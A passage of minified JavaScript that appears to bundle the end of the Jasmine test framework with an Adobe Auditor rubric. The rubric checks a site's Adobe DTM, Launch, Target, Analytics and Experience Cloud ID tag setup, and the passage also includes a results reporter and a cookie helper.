j!==t&&a!==s&&j<a-1})(o)&&(h={index:i.length,owner:a,nodes:[],min:s,max:t},i.push(h)),h.nodes.push(m),h.min=Math.min(h.min,o),h.max=Math.max(h.max,n),j=n}c.segments=i}function g(a){for(var b=[],c=[],d=0;d<a.length;d++)for(var e=a[d],f=q[e.id].segments,g=0;g<f.length;g++){var h=f[g];h.min===s?c.push(h):b.push(h)}return b.sort(function(a,b){return a.min-b.min}),b.concat(c)}function h(a,b){return a.children?{fn:function(c){var d={fn:function(b){m(a,b)}};l({onComplete:function(){var b=Array.prototype.slice.call(arguments,[0]);a.cleanupBeforeAfter(),n(a,a.getResult(),function(){c.apply(void 0,b)})},queueableFns:[d].concat(i(a,b)),userContext:a.sharedUserContext(),onException:function(){a.onException.apply(a,arguments)}})}}:{fn:function(b){a.execute(b,q[a.id].excluded)}}}function i(a,b){for(var c=[],d=q[a.id].segments[b].nodes,e=0;e<d.length;e++)c.push(h(d[e].owner,d[e].index));return q[a.id].willExecute?a.beforeAllFns.concat(c).concat(a.afterAllFns):c}var j=a.tree,k=a.runnableIds,l=a.queueRunnerFactory,m=a.nodeStart||function(){},n=a.nodeComplete||function(){},o=a.orderChildren||function(a){return a.children},p=a.excludeNode||function(a){return!1},q={valid:!0},r=!1,s=1/0,t=-1/0;this.processTree=function(){return c(j,!0),r=!0,q},this.execute=function(a){if(r||this.processTree(),!q.valid)throw"invalid order";var b=i(j,0);l({queueableFns:b,userContext:j.sharedUserContext(),onException:function(){j.onException.apply(j,arguments)},onComplete:a})}}return a},getJasmineRequireObj().UserContext=function(a){function b(){}return b.fromExisting=function(a){var c=new b;for(var d in a)a.hasOwnProperty(d)&&(c[d]=a[d]);return c},b},getJasmineRequireObj().version=function(){return"3.3.0"};var rubric={rubric_id:"RUee685640aaac423f8c06687070834a83",name:"Adobe Auditor Rubric",version:"1.0.6",description:"Adobe Auditor complete implementation test rubric",categories:[{category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3",name:"alerts",range_start:0,description:"Alerts do not impact your audit score. These are best practice recommendations that, in some cases, may not apply to your implementation.",feedback:"TBD"},{category_id:"CAc64fe1de6d684baba20b698ae65b5421",name:"presence",range_start:0,description:"Tag presence tests look for tags being loaded in the right locations on the page.",feedback:"TBD"},{category_id:"CAbcdcf6965ede4d81a0d6e0054fb0744d",name:"consistency",range_start:0,description:"Consistency tests look for inconsistencies across all scanned pages.  These are values or configurations that should be the same across all pages on the site to ensure accurate data collection.",feedback:"TBD"},{category_id:"CAc8a1b3d03301477e9ee224ded8929cdd",name:"configuration",range_start:0,description:"Configuration tests scan for specific settings, values or potential conflicts in your implementation.",feedback:"TBD"}],rubric_levels:[{id:"LEf62eab7387d84149b6dbe87ecc92fd41",name:"green",points:100},{Id:"LE6cf321e827c5469897fc2fb42f178af3",Name:"yellow",Points:90},{Id:"LE49fb3d397668473998005982e1dc781b",Name:"orange",Points:70},{Id:"LE1eb23a73b134413b95feb9a6018fa462",Name:"red",Points:60}],category_test_groups:[{category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3",category_tests:[{id:"TE2b93c0ed95414225b26e69d10f91339a",name:"DTM - Self-Hosted",description:"should not have a library file be pulled from assets.adobedtm.com",points:0,feedback_pass:'Passed: No action needed.<br/><br/>More information: Self-hosting is the recommended approach for loading DTM because it provides greater control of website performance through cache control, reducing third-party script dependencies, and greater control of the publishing process. The DTM libraries can be hosted and managed through your own web hosting or CDN.<br/><br/>Help documentation<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/deployment.html">DTM Embed Code and Hosting Options</a>',feedback_fail:'The DTM library is being hosted on Adobe\'s Akamai instance at assets.adobedtm.com.<br/><br/>Self-hosting is the recommended approach for loading DTM because it provides greater control of website performance through cache control, reducing third-party script dependencies, and greater control of the publishing process. The DTM libraries can be hosted and managed through your own web hosting or CDN.<br/><br/>Although DTM hosting via the Akamai CDN will work in most cases, it is recommended that self-hosting be implemented as the first step in improving page performance.<br/><br/>Help documentation<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/deployment.html">DTM Embed Code and Hosting Options</a>',category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3"},{id:"TE931cdbf1e506487ea48d84b4458f1aa6",name:"Launch - Self-Hosted",description:"should not have a library file be pulled from assets.adobedtm.com",points:0,feedback_pass:'Passed: No action needed.<br/><br/>More information: Self-hosting is the recommended approach for loading Launch because it provides greater control of website performance through cache control, reducing third-party script dependencies, and greater control of the publishing process. The Launch libraries can be hosted and managed through your own web hosting or CDN.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',feedback_fail:'The Launch library is being hosted on Adobe\'s Akamai instance at assets.adobedtm.com.<br/><br/>Self-hosting is the recommended approach for loading Launch because it provides greater control of website performance through cache control, reducing third-party script dependencies, and greater control of the publishing process. The Launch libraries can be hosted and managed through your own web hosting or CDN.<br/><br/>Although Launch hosting via the Akamai CDN will work in most cases, it is recommended that self-hosting be implemented as the first step in improving page performance.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3"},{id:"TEa9df69942f404055a64262889c8b21d3",name:"DTM - pageBottom callback placement",description:"should have a pageBottom callback function defined last in the body of the page",points:0,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/t_add_header_fooder_code.html">DTM Header and Footer Code</a>',feedback_fail:'Dynamic Tag Management requires the _satellite.pageBottom() function. Add the inline script immediately prior to the closing &lt;/body&gt; tag to ensure proper DTM functionality.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/t_add_header_fooder_code.html">DTM Header and Footer Code</a>',category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3"},{id:"TE48c499b022f545c5bccc6f8bde169685",name:"Launch - pageBottom callback placement",description:"should have a pageBottom callback function defined last in the body of the page if synchronously deployed",points:0,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',feedback_fail:'Launch requires the _satellite.pageBottom() function for synchronous deployments. Add the inline script immediately prior to the closing &lt;/body&gt; tag to ensure proper Launch functionality.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3"},{id:"TE46553c7a7a6a4ae4b0e39a61e108d2eb",name:"Launch - should be asynchronously deployed",description:"should be asynchronously deployed for optimal performance",points:0,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',feedback_fail:'Launch should be asynchronously deployed for optimal performance. Include the async parameter in the inline script to ensure proper async Launch functionality.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a><br/><a href="https://docs.adobelaunch.com/client-side-information/asynchronous-deployment">Launch Asynchronous Deployment</a>',category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3"},{id:"TE2d937efd50414c4090c8a599500caaf9",name:"Advertising Cloud - Correct Conversion Tag Implemented",description:"should not use old TubeMogul conversion pixel",points:0,feedback_pass:"Passed: no action needed",feedback_fail:"Upgrade your conversion pixels to the new Advertising Cloud image only conversion tags. Using the deprecated TubeMogul conversion tags can result in data loss. This can be accomplished more easily through the use of the Advertising Cloud Launch Extension.",category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3"},{id:"TE2ed673b92a88422499ea2be965f1b6ff",name:"Advertising Cloud - Image-only Tag",description:"should use latest segment pixel format",points:0,feedback_pass:"Passed: no action needed",feedback_fail:"Upgrade your AdCloud pixels to the new Advertising Cloud image only tags, which will ensure that you are taking full advantage of all the Advertising Cloud functionality. This can be accomplished more easily through the use of the Advertising Cloud Launch Extension.",category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3"},{id:"TE3f385cee6e354afc971523426d40d0b4",name:"Advertising Cloud - Segment Pixels DSP Syncing Enabled",description:"should use DSP syncing setting with TubeMogul segment pixel",points:0,feedback_pass:"Passed: no action needed",feedback_fail:"Add the URL parameter 'cs=1' to the Advertising Cloud pixels so that DSP Syncing can occur which will increase audience match rates. This can be accomplished more easily through the use of the Advertising Cloud Launch Extension.",category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3"},{id:"TE9739a1ca6c33458889ac0a11ca9dad86",name:"Advertising Cloud - Correct JS Tag Used",description:"should use latest javascript tags",points:0,feedback_pass:"Passed: no action needed",feedback_fail:"Upgrade your Advertising Cloud JavaScript to the latest version. Using the deprecated JavaScript versions can result in lost functionality. This can be accomplished more easily through the use of the Advertising Cloud Launch Extension.",category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3"},{id:"TE6814b2dde9384f3e8f1ab5b3ac1b0818",name:"Experience Cloud ID Service - Use only one AdobeOrg",description:"should only have one AMCV_ cookie defined in the page",points:0,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/mcvid/mcvid-implementation-guides.html">Implementation Guides</a>',feedback_fail:'Please validate that multiple AdobeOrg IDs should exist for this implementation. In most situations, only one AdobeOrg ID is used.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/mcvid/mcvid-implementation-guides.html">Implementation Guides</a>',category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3"},{id:"TEf6408a7d9199412abe8474018ceb9d6c",name:"Target - Content in mboxDefault",description:"should have content in mboxDefault with at.js implementation",points:0,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/target/ov2/r_target-atjs-mboxcreate.html">mboxCreate Function</a>',feedback_fail:'Content should exist in mboxDefault when using at.js. Verify that the content is available.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/target/ov2/r_target-atjs-mboxcreate.html">mboxCreate Function</a>',category_id:"CAce6db25bc8c443409f0fcc5ac9d622c3"}]},{category_id:"CAc64fe1de6d684baba20b698ae65b5421",category_tests:[{id:"TE981d1075617546cea58bedaac940c2b4",name:"DTM - Library loaded",description:"should have a global _satellite object defined in the DOM",points:5,feedback_pass:"Passed: no action needed",feedback_fail:'A global _satellite object was not found in the DOM. Dynamic Tag Management is either not installed or failing to execute. Please verify that the DTM library is implemented on the page and is not blocked by subsequent script activities.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/c_Troubleshooting.html">Troubleshooting DTM</a><br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/t_add_header_fooder_code.html">DTM Header and Footer Code</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TEc8600515c93446ba85e9923491a8a2d9",name:"Launch - Library loaded",description:"should have a global _satellite object defined in the DOM",points:5,feedback_pass:"Passed: no action needed",feedback_fail:'A global _satellite object was not found in the DOM. Launch is either not installed or failing to execute. Please verify that the Launch library is implemented on the page and is not blocked by subsequent script activities.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TE4e531fc2293940f0a73ce92d49164c32",name:"DTM - One embed code",description:"should only have one embed script loaded in the head tag",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/code.html">DTM Code</a>',feedback_fail:'Production sites should only load one DTM library. Please check to verify that only the production library is loading on the page.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/code.html">DTM Code</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TE13cbda7d29a14af8819efea294984ca3",name:"Launch - Not have multiple embed scripts",description:"should not have multiple embed scripts loaded on the page",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',feedback_fail:'Production sites should only load one Launch library. Please check to verify that only the production library is loading on the page.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TE6f8aa3efcee8481d94073244f1a7347e",name:"DTM - pageBottom callback exists in <body>",description:"should have a pageBottom callback function defined in the body of the page",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/t_add_header_fooder_code.html">DTM Header and Footer Code</a>',feedback_fail:'The _satellite.pageBottom() callback was not found within the &lt;body&gt; of the page, which is required by Dynamic Tag Management. Add the inline script immediately prior to the closing &lt;/body&gt; tag to ensure proper DTM functionality.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/t_add_header_fooder_code.html">DTM Header and Footer Code</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TEdd932a2c8dd54c5c8ed9ed086cfaafa5",name:"Launch - pageBottom callback exists in <body>",description:"should have a pageBottom callback function defined in the body of the page when synchronously deployed",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',feedback_fail:'The _satellite.pageBottom() callback was not found within the &lt;body&gt; of the page, which is required by Launch. Add the inline script immediately prior to the closing &lt;/body&gt; tag to ensure proper Launch functionality.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TEde9a10768dab476f85690b42a02a81c7",name:"Launch - pageBottom callback should not exist when asynchronously deployed",description:"should not have a pageBottom callback function defined when asynchronously deployed",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',feedback_fail:'The _satellite.pageBottom() callback was found on the page, which should not be the case when Launch is asynchronously deployed. Remove the _satellite.pageBottom() script to enable proper Launch functionality.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TE29ccb6a731e742c8a9cb048d7bbb3722",name:"Advertising Cloud - Code presence",description:"should be defined in the DOM",points:5,feedback_pass:"Passed: no action needed",feedback_fail:"The Advertising Cloud tag is not available in the DOM. The Advertising Cloud tag can be implemented easily using the Advertising Cloud Launch Extension.",category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TE4b9b4d79e4db4ed9adea8d0cb2debf8a",name:"Advertising Cloud - Segment Pixel Implemented",description:"should not use old segment pixel",points:5,feedback_pass:"Passed: no action needed",feedback_fail:"Upgrade your Advertising Cloud segment pixels to the new Advertising Cloud image-only tags. Using the deprecated AMO segment tags can result in data loss. This can be accomplished easily through the use of the Advertising Cloud Launch Extension.",category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TE60df6b34e5bb45fbae0609708869916b",name:"DTM - pageBottom tag fired",description:"should have fired pageBottom",points:5,
feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/t_add_header_fooder_code.html">DTM Header and Footer Code</a>',feedback_fail:'The DTM pageBottom tag was not detected. Be sure that the DTM pageBottom call is installed on every page.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/t_add_header_fooder_code.html">DTM Header and Footer Code</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TE0b98be6f92b847e0840717490174fce7",name:"Experience Cloud ID Service - Code presence",description:"should have MCID code loaded in the page",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/mcvid/mcvid-overview.html">Experience Cloud ID Service Overview</a>',feedback_fail:'The Experience Cloud ID Service code was not found. The ECID is highly recommended to ensure you get the most value out of your Experience Cloud solutions and is critical to ID management across EC solutions. Please install the most recent version of MCID.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/mcvid/mcvid-overview.html">Experience Cloud ID Service Overview</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TE8950b5e56b9c442eb03e2c48758c9c2e",name:"Experience Cloud ID Service - Cookie presence",description:"should have AMCV_ cookie defined in the page",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/mcvid/mcvid-implementation-guides.html">ECID Implementation Guides</a>',feedback_fail:'The AMCV_ cookie was not found. You must instantiate a visitor object from the VisitorAPI.js code. If this is a DTM implementation, verify that the AdobeOrg ID is properly entered into the MCID tool.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/mcvid/mcvid-implementation-guides.html">ECID Implementation Guides</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TE9679133761f14be992c2c478681561cc",name:"Experience Cloud ID Service - MID value present",description:"should have MID defined in the AMCV_ cookie",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/mcvid/mcvid_cookies.html">ECID Cookies</a>',feedback_fail:'The mid value was not found in the AMCV_ cookie. Test again to check for any MCID API latency. If the condition persists, please contact Adobe Customer Care.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/mcvid/mcvid_cookies.html">ECID Cookies</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TE75737b68e3e54c36810d45f98f7f1e55",name:"Target - Code presence",description:"should be defined in the DOM",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/target/ov/c_implementing_target.html">Implementing Target</a>',feedback_fail:'Install the most recent version of Target (at.js).<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/target/ov/c_implementing_target.html">Implementing Target</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"},{id:"TE61c380082a4b4706b28a84aa047599a7",name:"Target - Library loaded in <head>",description:"should have library loaded in <head>, not in <body>",points:4,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/target/ov/c_implementing_target.html">Implementing Target</a>',feedback_fail:'Check to be sure that the Target library is loaded in the &lt;head&gt; tag.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/target/ov/c_implementing_target.html">Implementing Target</a>',category_id:"CAc64fe1de6d684baba20b698ae65b5421"}]},{category_id:"CAc8a1b3d03301477e9ee224ded8929cdd",category_tests:[{id:"TEa6a62a187f9044408b9ebcfe5573eb73",name:"Target - Latest version",description:"should have latest Target code (at.js) loaded in the page",points:2,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/target/dtm/update-target-tool.html">Update the Target Tool in DTM</a>',feedback_fail:'These pages are not running the latest version of the Target code library. Code libraries that power Experience Cloud technologies are constantly being updated and tweaked in order to take advantage of performance improvements and provide the latest features. Please install the latest version of the Target library.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/target/dtm/update-target-tool.html">Update the Target Tool in DTM</a>',category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TEa20cd73613f24ed5a33025eca13fe2e2",name:"Launch - Latest version",description:"should have latest Launch code (Turbine) loaded in the page",points:2,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',feedback_fail:'These pages are not running the latest version of the Launch code library (Turbine). Code libraries that power Experience Cloud technologies are constantly being updated and tweaked in order to take advantage of performance improvements and provide the latest features. Please update the Launch library by rebuilding and publishing the Launch library.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/experience-cloud/launch/t_quick-start.html">Getting Started with Launch</a>',category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TE0b31d32ea04c4827ad2c4070b9b89ddf",name:"Target - mboxDefault precedes mboxCreate",description:"should have mboxDefault preceding mboxCreate when mboxCreate is used",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/target/ov2/r_target-atjs-mboxcreate.html">mboxCreate Function</a>',feedback_fail:"Be sure to have a div with class='mboxDefault' before invoking mboxCreate() because at.js will not add one for you. See help docs for an example of proper use of mboxCreate.<br/><br/>More information:<br/><a href=\"https://marketing.adobe.com/resources/help/en_US/target/ov2/r_target-atjs-mboxcreate.html\">mboxCreate Function</a>",category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TE7f4c9d145e8840fb8cc49854fbb8bc8b",name:"Target - Valid DOCTYPE",description:"should use a valid doc type (page rendered in standards mode)",points:5,feedback_pass:"Passed: no action needed",feedback_fail:"An invalid DOCTYPE was detected. No mboxes will be fired in this scenario. The DOCTYPE must be updated on the page.",category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TE012b02113be64df69b3322c874816eef",name:"Experience Cloud ID Service - Latest Version",description:"should have latest MCID code loaded in the page",points:2,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/macid.html">Experience Cloud ID Service on DTM</a>',feedback_fail:'These pages are not running the latest version of the Visitor ID Service code library, visitorAPI.js. Code libraries that power Experience Cloud technologies are constantly being updated and tweaked in order to take advantage of performance improvements and provide the latest features. Please install the latest version of the Visitor ID service library.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/macid.html">Experience Cloud ID Service on DTM</a>',category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TE2bffbe3c2fce47bfac1983d10585d6fe",name:"Advertising Cloud - Transaction ID Implemented Correctly",description:"should not use segment pixel with empty ev_transid property",points:1,feedback_pass:"Passed: no action needed",feedback_fail:"The property name 'ev_transid=' should not be left without a value ('ev_transid='). If this is left without a value there could be transaction data loss. Assign a value to the 'ev_transid=' or remove the parameter from the pixel.",category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TE56fa472f63894d45b9c81969266f63be",name:"Advertising Cloud - Conversion names use only alpha-numeric characters",description:"should use segment pixel with only numeric or decimal ev_ transaction property values",points:3,feedback_pass:"Passed: no action needed",feedback_fail:"Be sure that your transaction property parameters only contain numeric and decimal values. Any other value types may cause data loss.",category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TEd25f0337924b4adda9de6d083180407f",name:"Advertising Cloud - Conversion names use URL-safe characters",description:"should use segment pixel with well formed query params with no extra ? or & characters in parameter names",points:3,feedback_pass:"Passed: no action needed",feedback_fail:"Be sure that transaction property parameters do not contain a non-encoded ampersand or question mark as these will break the URL format, such as 'ev_formComplete?=1' or 'ev_formComplete&Submit=1', since this may result in data loss.",category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TE25af49c97653412399cdea50e5a86256",name:"DTM - Third-party tags load asynchronously after DOM ready",description:"should execute third party tags asynchronously and after DOM is ready",points:3,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/load_order.html">Load Order for DTM Rules</a>',feedback_fail:'To strike a balance between a good user experience and collecting accurate data, 3rd party tags should be triggered at DOM ready. This will ensure that those tracking scripts execute while not impacting site functionality. Resolve this issue by adjusting all rules that execute 3rd party pixels to fire at DOM Ready.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/dtm/load_order.html">Load Order for DTM Rules</a>',category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TEe98f4f22dd71484a97bd3e6484f1c101",name:"Analytics - Loaded in DOM",description:"should be loaded in the DOM (Adobe Analytics)",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/sc/implement/">Implement Adobe Analytics</a>',feedback_fail:'The Adobe Analytics tag was not detected. Please install the latest version of Analytics.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/sc/implement/">Implement Adobe Analytics</a>',category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TE5ea51084def54662b0e0a6e09837da29",name:"Analytics - Instantiated in DOM",description:"should be instantiated in the DOM (Adobe Analytics)",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/sc/implement/impl_testing.html">Testing and Validating Adobe Analytics</a>',feedback_fail:'The Adobe Analytics code is either not installed or failing to execute. Please verify that the Analytics tag is implemented on the page and is not blocked by subsequent script activities.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/sc/implement/impl_testing.html">Testing and Validating Adobe Analytics</a>',category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TEb824b26c0afb4195a1ca6155ad789627",name:"Analytics - Instantiated once",description:"should be instantiated only once in the DOM (Adobe Analytics)",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/sc/implement/">Implement Adobe Analytics</a>',feedback_fail:'The Adobe Analytics code was detected more than once on the page. Please ensure that there is only one Analytics tag on the page.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/sc/implement/">Implement Adobe Analytics</a>',category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"},{id:"TE0c5954ddc277488c97218e5110d09b8d",name:"Analytics - Latest version",description:"should have the latest analytics code loaded in the page (Adobe Analytics)",points:3,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/sc/appmeasurement/release/">AppMeasurement Release History</a>',feedback_fail:'These pages are not running the latest version of the Analytics code library. Code libraries that power Experience Cloud technologies are constantly being updated and tweaked in order to take advantage of performance improvements and provide the latest features. Please install the latest version of the Analytics library.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/sc/appmeasurement/release/">AppMeasurement Release History</a>',category_id:"CAc8a1b3d03301477e9ee224ded8929cdd"}]},{category_id:"CAbcdcf6965ede4d81a0d6e0054fb0744d",category_tests:[{id:"TE75737b68e3e54c36810d45f98f7f1333",name:"Analytics - Consistent code version",description:"should only have one Analytics version",points:5,feedback_pass:'Passed: no action needed<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/sc/implement/choose-implementation-method.html">Choosing an Analytics Implementation Method</a>',feedback_fail:'More than one version of the Analytics code was found. Please replace all instances of Analytics with the current version.<br/><br/>More information:<br/><a href="https://marketing.adobe.com/resources/help/en_US/sc/implement/choose-implementation-method.html">Choosing an Analytics Implementation Method</a>',category_id:"CAbcdcf6965ede4d81a0d6e0054fb0744d"}]}]},finalReport={logs:[],totalSpecs:0,stats:{},auditorTests:{},auditorTestsList:[]},myReporter=function(){var a={},b=function(a,b){finalReport.logs.push(a)};return a.jasmineStarted=function(a){b("Running "+a.totalSpecsDefined+" specs..."),b(""),finalReport.totalSpecs=a.totalSpecsDefined},a.suiteStarted=function(a){b("%c[Suite]"+a.description)},a.specStarted=function(a){b("[spec]"+a.description)},a.specDone=function(a){var c={passed:!a.failedExpectations.length,passedExpectations:a.passedExpectations,failedExpectations:a.failedExpectations,test:_getTestDefinitionById(_unitTestId)};finalReport.auditorTests[_unitTestId]=c,finalReport.auditorTestsList.push(c),finalReport.stats[a.status]=finalReport.stats[a.status]||0,finalReport.stats[a.status]+=1,b("=> "+a.status);for(var d=0;d<a.failedExpectations.length;d++)b("%cFailure: "+a.failedExpectations[d].message)},a.jasmineDone=function(){console.log("");var a=finalReport.totalSpecs+" examples";Object.keys(finalReport.stats).forEach(function(b){a+=", "+finalReport.stats[b]+" "+b}),b(a),finalReport.timestamp=Date.now(),finalReport.location=window.location.href,callback(finalReport)},a}(),jasmine=jasmineRequire.core(jasmineRequire);jasmine.getEnv().addReporter(myReporter);var jasmineInterface=jasmineRequire.interface(jasmine,jasmine.getEnv());extend(this,jasmineInterface),this._compareVersion=function(a,b){if(void 0===a||void 0===b)return-1;for(var c=a.split("."),d=b.split("."),e=0;e<3;e++){var f=Number(c[e]),g=Number(d[e]);if(g<f)return 1;if(f<g)return-1;if(!isNaN(f)&&isNaN(g))return 1;if(isNaN(f)&&!isNaN(g))return-1}return 0};var _adobeVars={},_unitTestId="";_adobeVars.currentVersions={analytics:"2.13.0",target:"2.1.0",visitor:"4.1.0",launch:"25.4.0"},this._modCookie={set:function(a,b,c){var d,e,f,g,h;g=c?((f=new Date).setTime(f.getTime()+24*c*60*60*1e3),"; expires="+f.toGMTString()):"",1===(h=location.host).split(".").length?document.cookie=a+"="+b+g+"; path=/":(d="."+(e=h.split("."))[e.length-2]+"."+e[e.length-1],document.cookie=a+"="+b+g+"; path=/; domain="+d,(null==_modCookie.get(a)||_modCookie.get(a)!=b)&&(d="."+h,document.cookie=a+"="+b+g+"; path=/; domain="+d))},get:function(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1,e.length);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null},search:function(a,b,c){var 